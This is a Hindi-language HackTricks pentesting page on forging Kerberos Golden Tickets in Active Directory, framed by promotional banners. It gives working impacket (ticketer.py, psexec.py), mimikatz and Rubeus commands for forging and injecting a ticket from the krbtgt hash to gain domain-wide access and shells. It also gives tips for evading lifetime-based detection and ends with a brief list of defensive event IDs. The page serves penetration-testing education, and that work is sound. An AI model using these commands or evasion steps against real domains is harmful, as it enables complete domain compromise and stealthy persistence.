# गोल्डन टिकट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## गोल्डन टिकट

एक मान्य **TGT के रूप में किसी भी उपयोगकर्ता** को **krbtgt AD खाते** के NTLM हैश का उपयोग करके बनाया जा सकता है। TGS की तुलना में TGT का जाल बिछाने का फायदा यह है कि डोमेन में किसी भी सेवा (या मशीन) और अनुकरण किए गए उपयोगकर्ता तक पहुंच सकने की क्षमता होती है।\
इसके अलावा, **krbtgt** के **क्रेडेंशियल्स** को स्वचालित रूप से **कभी नहीं बदला जाता** है।

**krbtgt** खाते का NTLM हैश डोमेन में किसी भी DC के **lsass प्रक्रिया** या **NTDS.dit फ़ाइल** से प्राप्त किया जा सकता है। इसे [Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) के **lsadump::dcsync** मॉड्यूल या impacket उदाहरण [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) के साथ **DCsync हमले** से भी प्राप्त किया जा सकता है। आमतौर पर, चाहे कौन सी तकनीक का उपयोग किया जाए, **डोमेन व्यवस्थापक विशेषाधिकार या समकक्ष** की आवश्यकता होती है।

इसे ध्यान में रखना चाहिए कि यह संभव है और **इच्छित** (ऑपसेक) है कि **AES Kerberos कुंजियों (AES128 और AES256)** का उपयोग करके टिकट जाल बिछाया जाए।

{% code title="लिनक्स से" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Windows से" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**एक बार** जब आपके पास **गोल्डन टिकट इंजेक्ट** हो जाए, तो आप साझा फ़ाइलों **(C$)** तक पहुंच सकते हैं, और सेवाएं और WMI को निष्पादित कर सकते हैं, इसलिए आप **psexec** या **wmiexec** का उपयोग करके एक शेल प्राप्त कर सकते हैं (ऐसा लगता है कि आप विनर्म के माध्यम से शेल प्राप्त नहीं कर सकते हैं)।

### सामान्य पकड़ों को छलना

गोल्डन टिकट का पता लगाने के सबसे आम तरीके हैं **तार पर केरबेरोस ट्रैफ़िक की जांच करके**। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 साल के लिए साइन करता है**, जो इसके साथ किए गए आगामी TGS अनुरोधों में असामान्य रूप से दिखेगा।

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

स्टार्ट ऑफ़सेट, अवधि और अधिकतम नवीकरण (सभी मिनट में) को नियंत्रित करने के लिए `/startoffset`, `/endin` और `/renewmax` पैरामीटर का उपयोग करें।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
दुर्भाग्यवश, TGT की आयु 4769 में लॉग नहीं की जाती है, इसलिए आप विंडोज इवेंट लॉग में इस सूचना को नहीं पाएंगे। हालांकि, आप यह सम्बंधित कर सकते हैं कि **4768 के पहले 4769 को देखें**। TGS का अनुरोध बिना TGT के **नहीं किया जा सकता है**, और यदि TGT जारी करने का कोई रिकॉर्ड नहीं है, तो हम यह समझ सकते हैं कि यह ऑफलाइन में जाली था।

इस डिटेक्शन को **बाईपास करने** के लिए डायमंड टिकट्स की जांच करें:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### सुरक्षा उपाय

* 4624: खाता लॉगऑन
* 4672: व्यवस्थापक लॉगऑन
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

रक्षकों के लिए अन्य छोटे तरीके हैं **संवेदनशील उपयोगकर्ताओं के लिए 4769 पर चेतावनी** देना, जैसे कि डिफ़ॉल्ट डोमेन प्रशासक खाता।

[**Golden Ticket के बारे में अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
